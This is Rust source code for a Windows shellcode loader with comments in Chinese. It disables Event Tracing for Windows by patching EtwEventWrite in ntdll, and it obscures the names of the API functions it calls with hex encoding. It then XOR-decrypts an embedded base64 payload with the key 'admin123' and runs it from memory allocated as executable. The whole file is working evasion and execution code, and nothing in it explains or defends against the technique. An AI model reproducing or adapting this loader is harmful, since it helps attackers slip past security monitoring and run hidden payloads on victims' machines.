

use base64::decode;
use std::{
    ffi::CString,
    {mem, u8}, os::windows::raw::HANDLE
};
use winapi::{
    shared::{
        minwindef::LPVOID,
        ntdef::{PVOID, ULONG},
        basetsd::SIZE_T
    },
    um::{
        libloaderapi::{GetModuleHandleA, GetProcAddress},
        processthreadsapi::{GetCurrentProcess, FlushInstructionCache},
        memoryapi::WriteProcessMemory,
        winnt::{PAGE_READWRITE, MEM_COMMIT, PAGE_EXECUTE_READWRITE}
    }
};


type VirtualAllocFn = unsafe extern "system" fn(
    lpAddress: *mut winapi::ctypes::c_void,
    dwSize: usize,
    flAllocationType: u32,
    flProtect: u32,
) -> *mut winapi::ctypes::c_void;
type TNtVirtual = extern "system" fn(
    ProcessHandle: HANDLE,
    BaseAddress: *mut PVOID,
    NumberOfBytesToProtect: *mut SIZE_T,
    NewAccessProtection: ULONG,
    OldAccessProtection: *mut ULONG,
) -> i32;
fn disableETW () {
    let patch: &[u8; 4] = &[0x48, 0x33, 0xc0, 0xc3]; // xor rax, rax; ret
    let mut old_protect: ULONG = 0;
    let size: usize = patch.len();

    let h_current_proc = unsafe { GetCurrentProcess() };
    
    let s_etw_event_write_name = CString::new(hex::decode("4574774576656e745772697465").expect("")).expect("CString::new failed");
    let ntdlName = CString::new(hex::decode("6e74646c6c2e646c6c").expect("")).expect("CString::new failed");
    let ntProName = CString::new(hex::decode("4e7450726f746563745669727475616c4d656d6f7279").expect("")).expect("CString::new failed");
    
    let h_ntdll = unsafe {GetModuleHandleA(ntdlName.as_ptr() as *const i8)};
    
    // 找到EtwEventWrite函数在虚拟内内存中的地址
    let p_event_write = unsafe {
        winapi::um::libloaderapi::GetProcAddress(
            h_ntdll,
            s_etw_event_write_name.as_ptr() as *const i8,
        )
    } as *const ();


    let far_proc = unsafe {
        winapi::um::libloaderapi::GetProcAddress(
            winapi::um::libloaderapi::GetModuleHandleA(ntdlName.as_ptr() as *const i8),
            ntProName.as_ptr() as *const i8,
        )
    }as *const ();

    let o_nt_virtual = unsafe {
        mem::transmute::<*const (), TNtVirtual>(far_proc)
    };

    // 将内存属性改成PAGE_READWRITE,这里size是我们需要修改内存的大小。
    unsafe {
        o_nt_virtual(
            h_current_proc as *mut std::ffi::c_void,
            p_event_write as *mut PVOID,
            size as *mut usize,
            PAGE_READWRITE,
            old_protect as *mut ULONG,
        );
    }

    // 修改内存
    unsafe {
        WriteProcessMemory(h_current_proc, p_event_write as *mut winapi::ctypes::c_void, patch.as_ptr() as LPVOID, size, old_protect as *mut usize);
    }

    // 恢复内存属性
    unsafe {
        o_nt_virtual(
            h_current_proc as *mut std::ffi::c_void,
            p_event_write as *mut PVOID,
            size as *mut usize,
            old_protect,
            old_protect as *mut ULONG,
        );
    }

    unsafe {
        FlushInstructionCache(h_current_proc, p_event_write as *const _, size);
    }

}
fn main() {
    let pt = "nSzujZ7Z+jNhZCw4L2FgYjcsXLsLeblhASzmO3Z5uWFBLOYbPnk9hCsuIFineQPzzVgMFWwdEnKgrWAob/DQ3jMlPCHlYxK4I1glaL5Xs0t5b28cHLqyu2FkbSHr8UZUKWW9OeV5KnfqJE0gb+HRZSmbpCjlBbp7YLIgWKd5A/PNJaygY3Az8lmEGJgiMn4XaSFUuBvpanfqJEkgb+FUcupoJS3lcS56YLQs4mq5ejKxJTUoNm9raSA8LDAva3qwjUQsO5HRanI4PiXifNh9zJ6bMANueIxECAoEBwtFMnI3LeSPIrjDctsoGk9pzud7UK0lWLx8A/MsVaQoPnBictteOxDJzufYEj4l4K9wim9wZG0kX/hzYiA1B2ovYHOJNu3yr5Hk2Wo6LOSoJgDgeui8IFinY1ozYyTpOzxwiNg0SlaWu3m79SnnrjkEO2176JUl4LR49fOem5KWIwD7YTMl10RoKUnMtOGtZuusMzNhLJKmYbW+MmFkhrqH1TMzYYzPlpHOHWs4Vhdp9OydQREDE26/OOgK4uIAHb6ixDwCGNeA89IfQfjKj7ZqHHTpc4piOejwNFk7mZ09L7wMszn0BwMTtiDeAp4VO1U9PYwLF2b2/zFnQAQWQCgJVFxHW0QgBhRYXl8AS1lHXhEaUA4JHQgaWFBfBF9NJD14dxNZSl1STmZbXQULGhpOf2YTV0pcUk5lQFoFAQMdQQUcA0hpZ2nM7RNfxqhnKCcAm51rN82mZqL3nXzQRnv506DBtbLVrCjk1HtYBMQG65PKbaeOrIRWnSvqji8m4SNn3R0Uel3JKEyXdMPMDI0gclS7qR/Sv2MygaDex009T/4+QVYVa+AWHdECpUoE7lTmHUaTSN6oLldJp/WFEdqSSQ5cZNmIG1Q0eeT/YgWsuuIeeBCc4ujAAYtccucUVOIximp+cN+YsoxwOTFAv+vHZW3zOVrD38Smm2fxdmZsLiFtI7SS4I6M6MVEJ6W8qT98XLjj/4tG0L8pb4Ib28WPTjkt9UNsMTExc42R0c8/keR6AqjebWkuMXOLYXRtaS+IcjNhZCzTNpVh1p6xJfo9Ynq6hizkmCa46HLZZE1pbni7yiDef//n083mKeepSevxRoUH72ohb/K38xSzNTE2eTczYWRtOa3Zrc6em15QQAACBE9WXlBAAgIzc1A7EQ==";
    let s = decode(pt).expect("");
    let key = "admin123".to_owned();
    let key_bytes = key.as_bytes();
    let mut s2 = vec![0; s.len()];
    for i in 0..s.len() {
        s2[i] = s[i] ^ key_bytes[i % key_bytes.len()];
    }
    let Kname = hex::decode("6b65726e656c33322e646c6c").expect("");
    let Vname = hex::decode("5669727475616c416c6c6f63").expect("");
    disableETW();
    let kernel32 = CString::new(Kname).expect("CString::new failed");
    let virtual_alloc = CString::new(Vname).expect("CString::new failed");
    let h_module = unsafe { GetModuleHandleA(kernel32.as_ptr() ) };

    let fn_virtual_alloc = unsafe {
        mem::transmute::<*const (), VirtualAllocFn>(
            GetProcAddress(
                h_module, 
                virtual_alloc.as_ptr()
            ) as *const ())
    };
    let Pexec = unsafe { fn_virtual_alloc(0 as _, s2.len(), MEM_COMMIT, PAGE_EXECUTE_READWRITE) };
    unsafe {
        let ptr = Pexec as *mut u8;
        std::ptr::copy_nonoverlapping(s2.as_ptr(), ptr, s2.len());
    }

    let f: fn() -> () = unsafe { mem::transmute(Pexec) };
    f();
}
